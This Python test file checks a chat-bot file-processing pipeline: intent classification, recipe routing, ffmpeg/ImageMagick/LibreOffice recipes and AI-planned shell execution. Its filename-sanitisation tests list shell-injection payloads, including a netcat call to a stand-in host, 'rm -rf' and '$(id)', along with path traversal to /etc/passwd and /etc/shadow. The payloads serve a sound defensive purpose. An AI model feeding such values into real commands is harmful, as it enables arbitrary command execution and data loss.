#!/usr/bin/env python3
"""
文件处理流水线测试 (tests/test_file_pipeline.py)

全部离线：意图判定只走关键词短路分支，规划循环用桩替换 call_agy，
执行层用真实 ImageMagick（属于 TOOLCHAIN 声明的必备依赖）。
"""

import os
import re
import shutil
import subprocess
import sys
import tempfile
import types

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import file_pipeline as fp
from tests.harness import main


def _has(binary):
    return shutil.which(binary) is not None


def _read_recipe(name):
    with open(os.path.join(fp.RECIPE_DIR, name), encoding="utf-8") as fh:
        return fh.read()


def _make_image(path, size="300x200", gradient="blue-red"):
    tool = "magick" if _has("magick") else "convert"
    subprocess.run(
        [tool, "-size", size, f"gradient:{gradient}", path],
        capture_output=True, timeout=30,
    )
    return os.path.exists(path)


def test_filename_injection(s):
    """文件名会进入 shell=True 执行的命令，必须先中和元字符。

    真实攻击面：用户转发一个来自频道的恶意命名文件即可触发任意命令执行，
    无需任何主动的危险操作。os.path.basename() 只挡路径穿越，不挡元字符。
    """
    s.section("shell 元字符必须被中和")
    payloads = [
        "report;touch PWNED;.pdf",
        "a$(id).jpg",
        "`whoami`.png",
        "x|nc evil 1234.mp4",
        "a && rm -rf ~.txt",
        "n\newline.jpg",
        "quote'\"quote.png",
        "glob*?[].jpg",
        "$HOME.txt",
        "tab\there.pdf",
    ]
    dangerous = set(";|&$`()<>*?[]{}!\\'\" \n\t\r")
    for raw in payloads:
        got = fp.safe_filename(raw)
        leaked = sorted(set(got) & dangerous)
        s.check(f"{raw!r} 无残留元字符", leaked, [])

    s.section("路径穿越")
    s.check("../../etc/passwd", fp.safe_filename("../../etc/passwd"), "passwd")
    s.check("绝对路径", fp.safe_filename("/etc/shadow"), "shadow")

    s.section("可用性：正常文件名不被破坏")
    s.check("中文保留", fp.safe_filename("季度报告.pdf"), "季度报告.pdf")
    s.check("常规英文", fp.safe_filename("report_v2-final.docx"), "report_v2-final.docx")
    s.truthy("空名有兜底", fp.safe_filename("") == "file")
    s.truthy("纯符号有兜底", fp.safe_filename("***") == "file")
    s.truthy("扩展名保留", fp.safe_filename("x;y.mp4").endswith(".mp4"))

    s.section("端到端：注入载荷经收敛后不再触发")
    if not (_has("convert") or _has("magick")):
        return
    work = tempfile.mkdtemp()
    try:
        safe = fp.safe_filename("report;touch PWNED_MARKER;.jpg")
        path = os.path.join(work, safe)
        _make_image(path)
        marker = os.path.join(work, "PWNED_MARKER")
        tool = "magick" if _has("magick") else "convert"
        fp.execute_commands([f"{tool} {path} -quality 40 {work}/out.jpg"], work)
        s.check("未产生注入痕迹", os.path.exists(marker), False)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_intent_shortcircuit(s):
    s.section("意图判定：关键词短路（零模型调用）")
    cases = [
        ("帮我压缩一下", ["a.jpg"], True),
        ("让这张图小一点", ["a.jpg"], True),
        ("拼成长图", ["a.jpg", "b.jpg"], True),
        ("转成gif", ["v.mp4"], True),
        ("提取音频", ["v.mp4"], True),
        ("这是什么", ["a.jpg"], False),
        ("帮我看看这个报错", ["a.png"], False),
        ("提取文字", ["a.png"], False),
        ("解释一下这段代码", ["a.png"], False),
        # 无附言必须走问答：物理处理是破坏性的，不能当默认
        ("", ["a.pdf"], False),
        (None, ["doc.pdf"], False),
    ]
    for caption, names, want in cases:
        got, how = fp.classify_intent(caption, names, "gemini-3.6-flash-high")
        s.check(f"{caption!r} → {how}", got, want)
        # 关键词/空附言分支绝不能触发模型调用
        s.check(f"{caption!r} 未调用模型", how in ("keyword", "empty"), True)


def test_recipe_selection(s):
    s.section("菜谱命中")
    s.check("拼接意图", [n for n, _ in fp.select_recipes(["a.jpg", "b.jpg"], "拼成长图")][:1],
            ["image_stitching.md"])
    s.check("压缩意图", [n for n, _ in fp.select_recipes(["a.png"], "压缩一下")][:1],
            ["image_compression.md"])
    s.check("转GIF意图", [n for n, _ in fp.select_recipes(["v.mp4"], "转gif")][:1],
            ["video_to_gif.md"])
    # 注意：.txt 现由 document_convert.md 覆盖，这里用真正无对应菜谱的扩展名
    s.check("无命中", fp.select_recipes(["x.xyz"], "随便弄弄"), [])

    s.section("菜谱与索引一致性")
    for entry in fp.RECIPE_INDEX:
        path = os.path.join(fp.RECIPE_DIR, entry["file"])
        s.check(f"{entry['file']} 存在", os.path.exists(path), True)
    for fname in sorted(os.listdir(fp.RECIPE_DIR)):
        if not fname.endswith(".md") or fname == "README.md":
            continue
        registered = any(e["file"] == fname for e in fp.RECIPE_INDEX)
        # 未注册的菜谱永远不会被命中，等于白写
        s.check(f"{fname} 已注册进 RECIPE_INDEX", registered, True)

    s.section("README 的菜谱清单不得过期")
    with open(os.path.join(fp.RECIPE_DIR, "README.md"), encoding="utf-8") as fh:
        # 只认表格行：菜谱名在正文别处被顺带提到，不等于它在清单里
        rows = "\n".join(ln for ln in fh if ln.lstrip().startswith("|"))
    for entry in fp.RECIPE_INDEX:
        # 清单是人查"有没有现成菜谱"的第一入口，漏一行就会有人重复造一份
        s.check(f"{entry['file']} 列入 README 清单", entry["file"] in rows, True)

    s.section("菜谱不得含执行环境不存在的占位写法")
    for fname in sorted(os.listdir(fp.RECIPE_DIR)):
        if not fname.endswith(".md") or fname == "README.md":
            continue
        with open(os.path.join(fp.RECIPE_DIR, fname), encoding="utf-8") as fh:
            body = fh.read()
        s.check(f"{fname} 无 $OUTPUT/$INPUT 变量", "$OUTPUT" in body or "$INPUT" in body, False)


def test_pdf_recipe_routing(s):
    """PDF 的两类需求必须各自命中正确的菜谱，且不夹带无关手册。"""
    s.section("压缩 vs 按页转图 的排序")
    cases = [
        ("压缩一下", "pdf_compression.md"),
        ("太大了帮我压压", "pdf_compression.md"),
        ("邮件附件太大", "pdf_compression.md"),
        ("按页转成图片", "pdf_to_images.md"),
        ("每页导出一张jpg", "pdf_to_images.md"),
        ("拆成图片", "pdf_to_images.md"),
        ("转png", "pdf_to_images.md"),
    ]
    for caption, expected in cases:
        picked = [n for n, _ in fp.select_recipes(["report.pdf"], caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None, expected)
        # 两份 PDF 手册都提供是合理的（意图接近时让 Planner 自行取舍），
        # 但绝不能混入图片/视频类手册
        s.check(f"{caption!r} 无跨类型噪声",
                [n for n in picked if not n.startswith("pdf_")], [])

    s.section("扩展名不匹配的菜谱一律不入选")
    for names, forbidden in (
        (["report.pdf"], "image_compression.md"),
        (["photo.jpg"], "pdf_compression.md"),
        (["clip.mp4"], "pdf_to_images.md"),
    ):
        picked = [n for n, _ in fp.select_recipes(names, "压缩一下")]
        s.check(f"{names[0]} 不含 {forbidden}", forbidden in picked, False)

    s.section("PDF 相关措辞走关键词短路，不烧模型调用")
    for caption in ("压缩一下", "太大了帮我压压", "按页转成图片",
                    "每页导出一张jpg", "转png", "拆成图片"):
        _, how = fp.classify_intent(caption, ["report.pdf"], "m")
        s.check(f"{caption!r} 判定方式", how, "keyword")


def test_image_to_pdf_routing(s):
    """图片转 PDF 与图片拼接必须区分开 —— 两者都能"合并多张图"，但产物完全不同。"""
    imgs = ["photo_01.jpg", "photo_02.jpg"]

    s.section("转 PDF 的措辞命中 images_to_pdf")
    for caption in ("转成pdf", "做成pdf", "合并成pdf", "打包成pdf", "生成pdf"):
        picked = [n for n, _ in fp.select_recipes(imgs, caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None, "images_to_pdf.md")

    s.section("拼接的措辞仍命中 image_stitching")
    for caption in ("拼成长图", "上下拼接", "合并成一张", "左右拼接"):
        picked = [n for n, _ in fp.select_recipes(imgs, caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None, "image_stitching.md")

    s.section("最长关键词优先")
    # 「合并成pdf」同时匹配 image_stitching 的「合并成」与本份的「合并成pdf」，
    # 必须由更长、更具体的那个胜出
    picked = [n for n, _ in fp.select_recipes(imgs, "合并成pdf")]
    s.check("更具体的关键词胜出", picked[0], "images_to_pdf.md")

    s.section("意图判定走关键词短路")
    for caption in ("转成pdf", "合并成pdf", "做成pdf", "打包成pdf"):
        _, how = fp.classify_intent(caption, imgs, "m")
        s.check(f"{caption!r} 判定方式", how, "keyword")


def test_recipe_selection_precision(s):
    """明确意图时不应再塞入靠扩展名兜底的手册 —— 那是 prompt 噪声。"""
    s.section("有关键词命中时只给命中的手册")
    for names, caption, expected in (
        (["a.jpg"], "压缩一下", ["image_compression.md"]),
        (["a.jpg"], "转成pdf", ["images_to_pdf.md"]),
        (["r.pdf"], "压缩一下", ["pdf_compression.md"]),
        (["r.pdf"], "按页转成图片", ["pdf_to_images.md"]),
        (["v.mp4"], "转gif", ["video_to_gif.md"]),
    ):
        s.check(f"{names[0]} {caption!r}",
                [n for n, _ in fp.select_recipes(names, caption)], expected)

    s.section("无关键词命中时才用扩展名兜底")
    picked = [n for n, _ in fp.select_recipes(["a.jpg"], "随便弄弄")]
    s.truthy("给出候选手册", len(picked) > 0)
    s.check("兜底候选均为图片类", [n for n in picked if not n.startswith("image")], [])


def test_video_trim_routing(s):
    """视频剪辑与转 GIF 是两类需求，措辞必须各自命中。"""
    vids = ["clip.mp4"]

    s.section("剪辑措辞命中 video_trim")
    for caption in ("剪掉10到15秒", "把20-25秒去掉", "只要第30秒到40秒",
                    "掐头去尾", "两段视频接起来", "剪辑一下"):
        picked = [n for n, _ in fp.select_recipes(vids, caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None, "video_trim.md")
        _, how = fp.classify_intent(caption, vids, "m")
        s.check(f"{caption!r} 走关键词短路", how, "keyword")

    s.section("转 GIF 仍命中 video_to_gif")
    for caption in ("转成gif", "做成表情包", "转动图"):
        picked = [n for n, _ in fp.select_recipes(vids, caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None, "video_to_gif.md")

    s.section("视觉类问答仍走问答链路")
    # "讲了什么/说了什么"对音视频已改判为转写（见 test_speech_media_intent），
    # 此处只校验真正的视觉提问不被误判为处理
    for caption in ("帮我看看这段视频", "画面里是什么", "这是什么场景"):
        proc, _ = fp.classify_intent(caption, vids, "m")
        s.check(f"{caption!r} 判为问答", proc, False)


def test_video_trim_recipe_params(s):
    """守住剪辑菜谱里几条经实测确认的要点。"""
    body = _read_recipe("video_trim.md")
    commands = "\n".join(re.findall(r"```bash\n(.*?)```", body, re.DOTALL))
    lines = [ln for ln in commands.splitlines()
             if ln.strip() and not ln.strip().startswith("#")]

    s.section("必须重编码，不得用流拷贝")
    # 实测：-c copy 多段剪辑会因关键帧吸附导致画面整体偏移约 1 秒
    s.check("剪辑命令中无 -c copy", [ln for ln in lines if "-c copy" in ln], [])
    s.truthy("说明了流拷贝的问题", "关键帧" in body and "偏移" in body)

    s.section("select 必须配套 setpts（否则丢弃段留下卡顿空洞）")
    # 分别取出 -vf / -af 的内容再判断：`asetpts` 含有 `setpts` 子串，
    # 整行做包含判断会被自己骗过去
    for ln in lines:
        for flag, need in (("-vf", "setpts="), ("-af", "asetpts=")):
            m = re.search(rf'{flag} "([^"]*)"', ln)
            if not m:
                continue
            body_ = m.group(1)
            if "select=" not in body_:
                continue
            if flag == "-vf":
                # 去掉 asetpts 干扰后再判断视频侧的 setpts
                probe = body_.replace("asetpts=", "")
                s.check(f"{flag} 含 setpts", "setpts=" in probe, True)
            else:
                s.check(f"{flag} 含 asetpts", need in body_, True)

    s.section("合并多视频必须统一尺寸")
    s.truthy("警告 concat 解复用器的陷阱", "-f concat" in body and "坏文件" in body)
    merge = [ln for ln in lines if "concat=n=" in ln]
    s.truthy("提供了 concat 滤镜方案", len(merge) > 0)
    s.check("合并命令带缩放统一",
            [ln for ln in merge if "scale=" not in ln], [])


def test_video_compression_routing(s):
    """三类视频需求（压缩 / 剪辑 / 转 GIF）必须各归各位。"""
    vids = ["clip.mp4"]

    s.section("各自命中")
    for caption, expected in (
        ("压缩一下", "video_compression.md"),
        ("太大了发不出去", "video_compression.md"),
        ("小一点", "video_compression.md"),
        ("邮件附件太大", "video_compression.md"),
        ("剪掉10到15秒", "video_trim.md"),
        ("掐头去尾", "video_trim.md"),
        ("转成gif", "video_to_gif.md"),
        ("做成表情包", "video_to_gif.md"),
    ):
        picked = [n for n, _ in fp.select_recipes(vids, caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None, expected)

    s.section("不得污染其它文件类型")
    s.check("图片的压缩", [n for n, _ in fp.select_recipes(["a.jpg"], "压缩一下")],
            ["image_compression.md"])
    s.check("PDF 的压缩", [n for n, _ in fp.select_recipes(["r.pdf"], "压缩一下")],
            ["pdf_compression.md"])


def test_video_compression_recipe_params(s):
    """守住压缩菜谱里几条经实测确认、且与直觉相反的结论。"""
    body = _read_recipe("video_compression.md")
    commands = "\n".join(re.findall(r"```bash\n(.*?)```", body, re.DOTALL))
    lines = [ln for ln in commands.splitlines()
             if ln.strip() and not ln.strip().startswith("#")]

    s.section("必须先看码率（低码率再压会变大）")
    s.truthy("提示依据码率决策", "码率" in body)
    s.truthy("说明可能越压越大", "变大" in body or "增加" in body)

    s.section("命令要点")
    s.check("每条命令都指定 CRF", [ln for ln in lines if "-crf" not in ln], [])
    s.check("每条命令都固定 pix_fmt（保证兼容播放）",
            [ln for ln in lines if "-pix_fmt yuv420p" not in ln], [])
    s.check("每条命令都带 faststart",
            [ln for ln in lines if "+faststart" not in ln], [])
    s.check("缩放使用 -2 保证偶数尺寸",
            [ln for ln in lines if "scale=" in ln and "-2" not in ln], [])

    s.section("preset 不是体积杠杆（实测 slow 反而更大）")
    s.truthy("记录了这一反直觉结论", "preset" in body and "不是体积杠杆" in body)
    s.check("命令一律用 veryfast",
            [ln for ln in lines if "-preset" in ln and "veryfast" not in ln], [])


def test_probe_reports_bitrate(s):
    """码率是判断"是否已压过"的依据，探针必须提供。"""
    if not shutil.which("ffmpeg"):
        s.section("码率探针（跳过：未安装 ffmpeg）")
        return
    work = tempfile.mkdtemp()
    try:
        clip = os.path.join(work, "c.mp4")
        subprocess.run(
            ["ffmpeg", "-v", "error", "-f", "lavfi",
             "-i", "testsrc2=size=320x240:rate=15:duration=2",
             "-c:v", "libx264", "-pix_fmt", "yuv420p", "-y", clip],
            capture_output=True, timeout=120,
        )
        s.section("视频元数据")
        meta = fp.probe_file(clip)
        s.truthy("含时长", "时长" in meta)
        s.truthy("含分辨率", "320x240" in meta)
        s.truthy("含码率", "码率" in meta and "kbps" in meta)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_speech_media_intent(s):
    """音视频问"讲了什么"要的是转写，不是让模型描述画面。"""
    s.section("音视频 → 判为处理（转写）")
    for names in (["clip.mp4"], ["rec.m4a"], ["v.mkv"], ["a.wav"]):
        for caption in ("讲了什么", "说了什么", "里面在说什么", "聊了什么"):
            proc, how = fp.classify_intent(caption, names, "m")
            s.check(f"{names[0]} {caption!r}", (proc, how), (True, "keyword"))

    s.section("图片/PDF → 同样问法仍是视觉问答")
    for names in (["photo.jpg"], ["report.pdf"], ["shot.png"]):
        for caption in ("讲了什么", "说了什么", "这是什么"):
            proc, _ = fp.classify_intent(caption, names, "m")
            s.check(f"{names[0]} {caption!r} 判为问答", proc, False)

    s.section("转写菜谱的必备参数")
    body = _read_recipe("media_transcribe.md")
    curls = [ln for ln in body.splitlines()
             if ln.strip().startswith("curl") and "transcriptions" in ln]
    s.truthy("存在转写请求命令", len(curls) > 0)
    # 不带 prompt 时 small 模型输出繁体且几乎无标点（已实测）
    s.check("每条转写请求都带 prompt 引导",
            [ln for ln in curls if "prompt=" not in ln], [])
    s.check("每条都指定了 language",
            [ln for ln in curls if "language=" not in ln], [])
    s.check("每条都指定了 response_format",
            [ln for ln in curls if "response_format=" not in ln], [])
    # 抽轨必须是 Whisper 期望的 16kHz 单声道
    ffm = [ln for ln in body.splitlines() if ln.strip().startswith("ffmpeg")]
    s.check("抽轨统一为 16kHz 单声道",
            [ln for ln in ffm if "-ar 16000" not in ln or "-ac 1" not in ln], [])

    s.section("转写措辞命中 media_transcribe")
    for caption in ("提取对话", "转成文字", "要字幕", "会议记录", "听写"):
        picked = [n for n, _ in fp.select_recipes(["clip.mp4"], caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None,
                "media_transcribe.md")


def test_rejection_channel(s):
    """需求不成立时应给出解释，而不是伪装成"格式错误"。"""
    s.section("prompt 中声明了拒绝通道")
    prompt = fp.build_plan_prompt(["/a/clip.mp4"], "/out", "转成word")
    s.truthy("含 <reject> 说明", "<reject>" in prompt)
    s.truthy("举了不成立的例子", "视频转成 Word" in prompt or "毫无关系" in prompt)

    s.section("解析")
    s.check("提取拒绝理由",
            fp.extract_rejection("<reject>视频与 Word 没有转换关系</reject>"),
            "视频与 Word 没有转换关系")
    s.check("正常命令不误判", fp.extract_rejection('<json>["echo x"]</json>'), "")

    s.section("端到端：拒绝而非报格式错误")
    work = tempfile.mkdtemp()
    original = fp.call_agy
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        with open(os.path.join(win, "clip.mp4"), "w") as fh:
            fh.write("x")
        _reason = (
            "<reject>视频是画面与声音，与 Word 文档没有转换关系。"
            "若你要的是台词，可以做语音转写。</reject>"
        )
        fp.call_agy = lambda p, m, t: (True, _reason, None)
        ok, products, err = fp.plan_and_execute(
            [os.path.join(win, "clip.mp4")], win, wout, "转成word", "m")
        s.check("判为不成功", ok, False)
        s.check("无产物", products, [])
        s.truthy("给出了理由", "没有转换关系" in err)
        s.truthy("给出了替代做法", "语音转写" in err)
        s.check("未伪装成格式错误", "未能输出合法" in err, False)
    finally:
        fp.call_agy = original
        shutil.rmtree(work, ignore_errors=True)


def test_document_convert_boundaries(s):
    """文档菜谱必须写清能力边界，否则模型会硬凑不成立的转换。"""
    body = _read_recipe("document_convert.md")

    s.section("边界声明")
    s.truthy("说明不能输出 PDF", "PDF" in body and "LaTeX" in body)
    s.truthy("说明音视频图片无法转文档", "视频" in body and "没有转换关系" in body)
    s.truthy("指引 PDF 取文本用 pdftotext", "pdftotext" in body)
    s.truthy("要求不成立时输出 reject", "<reject>" in body)

    s.section("路由")
    for names, caption, expected in (
        (["note.md"], "转word", "document_convert.md"),
        (["a.docx"], "转md", "document_convert.md"),
        (["p.html"], "转epub", "document_convert.md"),
    ):
        picked = [n for n, _ in fp.select_recipes(names, caption)]
        s.check(f"{names[0]} {caption!r}", picked[0] if picked else None, expected)

    s.section("音视频不得命中文档菜谱")
    for names in (["clip.mp4"], ["rec.m4a"], ["photo.jpg"]):
        picked = [n for n, _ in fp.select_recipes(names, "转成word")]
        s.check(f"{names[0]}", "document_convert.md" in picked, False)


def test_office_convert_recipe(s):
    """Office 菜谱必须守住两条实测结论，并与 pandoc 菜谱分工清晰。"""
    body = _read_recipe("office_convert.md")

    s.section("实测结论")
    # libreoffice 加载失败时只在 stdout 报错，退出码仍是 0 —— 这是那次
    # xls→pdf 失败被误判为成功的根因，菜谱必须显式点出来。
    # 断言落在**同一行**上：只留"不能靠退出码判断"而删掉"仍是 0"的版本
    # 会让模型以为退出码非零就代表失败，必须判失败。
    s.truthy("有一行明确写出失败时退出码为 0",
             any("退出码" in ln and "0" in ln for ln in body.splitlines()))
    s.truthy("引用了失败时的实际报错串",
             "source file could not be loaded" in body)
    s.truthy("给出可信判据是产物是否存在", "产物是否存在" in body)
    # 缺少独立 profile 时并发实例会静默退出、不产出文件
    s.truthy("要求独立 UserInstallation", "-env:UserInstallation" in body)

    s.section("命令形态")
    cmds = [ln for ln in body.splitlines() if ln.strip().startswith("soffice")]
    s.truthy("存在转换命令", len(cmds) > 0)
    s.check("每条都是 headless",
            [ln for ln in cmds if "--headless" not in ln], [])
    s.check("每条都带独立 profile",
            [ln for ln in cmds if "-env:UserInstallation" not in ln], [])
    s.check("每条都指定 --outdir",
            [ln for ln in cmds if "--outdir" not in ln], [])

    s.section("与 pandoc 菜谱的分工")
    for names, caption, expected in (
        (["表.xls"], "转成pdf", "office_convert.md"),
        (["表.xlsx"], "导出pdf", "office_convert.md"),
        (["稿.doc"], "转pdf", "office_convert.md"),
        (["讲义.pptx"], "转pdf", "office_convert.md"),
        (["a.docx"], "转成pdf", "office_convert.md"),
        # 文本结构互转仍归 pandoc
        (["a.docx"], "转md", "document_convert.md"),
        (["note.md"], "转word", "document_convert.md"),
    ):
        picked = [n for n, _ in fp.select_recipes(names, caption)]
        s.check(f"{names[0]} {caption!r}", picked[0] if picked else None, expected)

    s.section("不得跨类型污染")
    for names in (["clip.mp4"], ["photo.jpg"], ["r.pdf"]):
        picked = [n for n, _ in fp.select_recipes(names, "转成pdf")]
        s.check(f"{names[0]}", "office_convert.md" in picked, False)

    s.section("Office 措辞被判为物理处理")
    # 必须由关键词直接判定：走到 how=="model" 意味着要为一句
    # 「转excel」多跑一次 agy 往返，且结论随模型漂移
    for caption in ("转成pdf", "导出pdf", "打印成pdf", "转excel", "转幻灯片"):
        proc, how = fp.classify_intent(caption, ["表.xls"], "m")
        s.check(f"{caption!r}", (proc, how), (True, "keyword"))


def test_inline_text_products(s):
    """转写稿这类文本产物应直接作为消息发出，而不是让用户下载附件。"""
    s.section("扩展名与阈值")
    s.truthy(".txt 属于文本类", ".txt" in fp.TEXT_EXTS)
    s.truthy(".srt 属于文本类", ".srt" in fp.TEXT_EXTS)
    s.truthy("有长度上限", fp.INLINE_TEXT_MAX_CHARS > 0)

    from core.handlers import agy_handler as ah
    work = tempfile.mkdtemp()
    try:
        sent = []

        class _Bot:
            def send_chat_action(self, *a, **k):
                pass

            def send_message(self, cid, text, **k):
                sent.append(("message", text))
                return types.SimpleNamespace(message_id=1)

            def send_document(self, cid, fh, **k):
                sent.append(("document", os.path.basename(fh.name)))

        short = os.path.join(work, "t.txt")
        with open(short, "w", encoding="utf-8") as fh:
            fh.write("今天的会议讨论了三个议题")
        ah._send_product(_Bot(), 1, 1, short)
        s.check("短文本作为消息发出", sent[-1][0], "message")
        s.truthy("消息含正文", "三个议题" in sent[-1][1])

        long_path = os.path.join(work, "big.txt")
        with open(long_path, "w", encoding="utf-8") as fh:
            fh.write("x" * (fp.INLINE_TEXT_MAX_CHARS + 100))
        ah._send_product(_Bot(), 1, 1, long_path)
        s.check("超长仍作为附件", sent[-1][0], "document")
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_product_packaging(s):
    """产物过多时自动打包 —— PDF 按页转图动辄几十张，逐个发送会刷屏。"""
    s.section("阈值行为")
    work = tempfile.mkdtemp()
    try:
        def make(n):
            for f in os.listdir(work):
                os.remove(os.path.join(work, f))
            paths = []
            for i in range(n):
                path = os.path.join(work, f"page-{i:02d}.jpg")
                with open(path, "w") as fh:
                    fh.write("x" * 200)
                paths.append(path)
            return paths

        out, packed = fp.package_products(make(fp.MAX_INLINE_PRODUCTS), work, "doc.pdf")
        s.check(f"{fp.MAX_INLINE_PRODUCTS} 个（等于阈值）不打包", packed, False)
        s.check("原样返回全部产物", len(out), fp.MAX_INLINE_PRODUCTS)

        out, packed = fp.package_products(make(fp.MAX_INLINE_PRODUCTS + 1), work, "doc.pdf")
        s.check("超过阈值则打包", packed, True)
        s.check("只投递 1 个压缩包", len(out), 1)
        s.truthy("产物是 zip", out[0].endswith(".zip"))

        import zipfile
        with zipfile.ZipFile(out[0]) as zf:
            s.check("压缩包内含全部页面", len(zf.namelist()), fp.MAX_INLINE_PRODUCTS + 1)
        s.check("散件已清理",
                [f for f in os.listdir(work) if f.endswith(".jpg")], [])

        s.section("压缩包命名沿用输入名且经过安全收敛")
        out, _ = fp.package_products(make(20), work, "report;rm -rf .pdf")
        s.check("包名无 shell 元字符",
                sorted(set(os.path.basename(out[0])) & set(";|&$`() ")), [])
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_toolchain_trim(s):
    s.section("工具链裁剪")
    tc = fp.load_toolchain()
    s.truthy("含 FFmpeg", "FFmpeg" in tc)
    s.truthy("含 pngquant", "pngquant" in tc)
    s.check("已剔除 PostgreSQL 噪声", "PostgreSQL" in tc, False)
    s.check("已剔除 qBittorrent 噪声", "qBittorrent" in tc, False)


def test_command_extraction(s):
    s.section("命令提取容错")
    s.check("<json> 标签", fp._extract_commands('废话<json>["echo a","echo b"]</json>尾巴'),
            ["echo a", "echo b"])
    s.check("```json 代码块", fp._extract_commands('```json\n["echo x"]\n```'), ["echo x"])
    s.check("裸数组", fp._extract_commands('这是计划: ["echo y"] 完毕'), ["echo y"])
    s.check("纯散文无命令", fp._extract_commands("我觉得这张图很好看"), None)
    s.check("空数组视为无效", fp._extract_commands("<json>[]</json>"), None)


def test_execution_layer(s):
    if not (_has("convert") or _has("magick")):
        s.section("执行层（跳过：未安装 ImageMagick）")
        return

    work = tempfile.mkdtemp()
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)

        s.section("执行层：捕获真实 stderr")
        s.truthy("测试素材生成", _make_image(f"{win}/src.jpg"))
        tool = "magick" if _has("magick") else "convert"
        ok, failure = fp.execute_commands([f"{tool} {win}/src.jpg -quality 40 {wout}/out.jpg"], win)
        s.check("正常压缩成功", ok, True)
        s.check("产物存在", os.path.exists(f"{wout}/out.jpg"), True)

        ok, failure = fp.execute_commands([f"{tool} /nonexistent/nope.jpg out.jpg"], win)
        s.check("失败被捕获", ok, False)
        s.truthy("拿到真实 stderr 而非返回码", "nope.jpg" in failure["stderr"])

        s.section("产物兜底回收（模型写相对路径的经典翻车）")
        win2, wout2 = os.path.join(work, "in2"), os.path.join(work, "out2")
        os.makedirs(win2)
        os.makedirs(wout2)
        _make_image(f"{win2}/src.png", gradient="green-black")
        original = set(os.listdir(win2))
        ok, _ = fp.execute_commands([f"{tool} src.png -quality 40 stitched_result.jpg"], win2)
        s.check("相对路径命令执行成功", ok, True)
        s.check("产物确实落错目录", os.path.exists(f"{win2}/stitched_result.jpg"), True)
        products = fp.collect_outputs(win2, wout2, original)
        s.check("兜底回收到 1 个产物", len(products), 1)
        s.check("已搬进输出目录",
                os.path.basename(products[0]) if products else None, "stitched_result.jpg")

        s.section("元数据探针")
        s.truthy("图片含尺寸", "300x200" in fp.probe_file(f"{win}/src.jpg"))
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_disproportionate_detection(s):
    """判据是"产物相对输入失衡"，不是绝对大小。

    只用绝对阈值会误伤合理的大任务 —— 100 张图合成 PDF 无论如何都超阈值，
    要求降参只会白白毁画质且仍然超标。
    """
    work = tempfile.mkdtemp()
    try:
        def product(mb):
            path = os.path.join(work, "o.bin")
            with open(path, "wb") as fh:
                fh.write(b"0" * int(mb * 1024 * 1024))
            return [path]

        floor_mb = fp.OVERSIZE_FLOOR_BYTES / 1048576
        s.section("参数失当 → 判定失衡")
        for label, inp, out in (("2MB 输入 → 9MB 产物", 2, 9),
                                ("1MB 输入 → 15MB 产物", 1, 15)):
            s.truthy(label, bool(fp._disproportionate_products(
                product(out), int(inp * 1048576))))

        s.section("任务本身就大 → 不得判定失衡")
        for label, inp, out in (("30MB 图包 → 25MB PDF", 30, 25),
                                ("50MB 图包 → 45MB PDF", 50, 45),
                                ("20MB 视频 → 8MB GIF", 20, 8)):
            s.check(label, fp._disproportionate_products(
                product(out), int(inp * 1048576)), "")

        s.section("低于关注线一律不折腾")
        s.check(f"产物 {floor_mb / 2:.1f}MB（远小于输入的 1/10）",
                fp._disproportionate_products(product(floor_mb / 2), 1024), "")
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_oversized_product_feedback(s):
    """失衡时把实际体积回喂给 Planner 重做；体量相称时直接投递。"""
    if not (_has("convert") or _has("magick")):
        s.section("体积回喂（跳过：未安装 ImageMagick）")
        return

    tool = "magick" if _has("magick") else "convert"
    work = tempfile.mkdtemp()
    original_call = fp.call_agy
    original_floor = fp.OVERSIZE_FLOOR_BYTES
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        _make_image(f"{win}/src.png", size="200x200")
        fp.OVERSIZE_FLOOR_BYTES = 5_000

        s.section("产物远大于输入 → 回喂并重做")
        prompts = []

        def stub(prompt, model, timeout):
            prompts.append(prompt)
            width = 2400 if len(prompts) == 1 else 60
            return True, (f'<json>["{tool} {win}/src.png -resize {width}x '
                          f'{wout}/out.png"]</json>'), None

        fp.call_agy = stub
        steps = []
        ok, products, _ = fp.plan_and_execute(
            [f"{win}/src.png"], win, wout, "缩放", "m", steps.append)

        s.check("触发了第二轮规划", len(prompts), 2)
        s.truthy("重规划 prompt 含实际体积对比", "而输入仅" in prompts[1])
        s.truthy("提示可能是任务本身就大", "任务本身决定" in prompts[1])
        s.truthy("状态播报提示产物偏大", any("偏大" in x for x in steps))
        s.check("未把体积失衡误报为执行报错",
                [x for x in steps if "执行报错" in x], [])
        s.check("最终成功", ok, True)
        s.check("产出 1 个文件", len(products), 1)

        s.section("产物与输入体量相称 → 直接投递，不额外规划")
        prompts.clear()
        for f in os.listdir(wout):
            os.remove(os.path.join(wout, f))
        # 关注线设为 0 使绝对条件必然满足，只剩比例条件把关
        fp.OVERSIZE_FLOOR_BYTES = 0
        fp.call_agy = lambda p, m, t: (
            True, f'<json>["{tool} {win}/src.png {wout}/same.png"]</json>', None)
        ok, products, _ = fp.plan_and_execute(
            [f"{win}/src.png"], win, wout, "转换", "m")
        s.check("只规划一次", len(prompts), 0)
        s.check("成功", ok, True)
        s.check("产出 1 个文件", len(products), 1)
    finally:
        fp.call_agy = original_call
        fp.OVERSIZE_FLOOR_BYTES = original_floor
        shutil.rmtree(work, ignore_errors=True)


def test_plan_prompt(s):
    s.section("Planner prompt 组装")
    prompt = fp.build_plan_prompt(["/abs/in/src.jpg"], "/abs/out", "压缩一下")
    s.truthy("内联了菜谱正文", "pngquant --quality" in prompt)
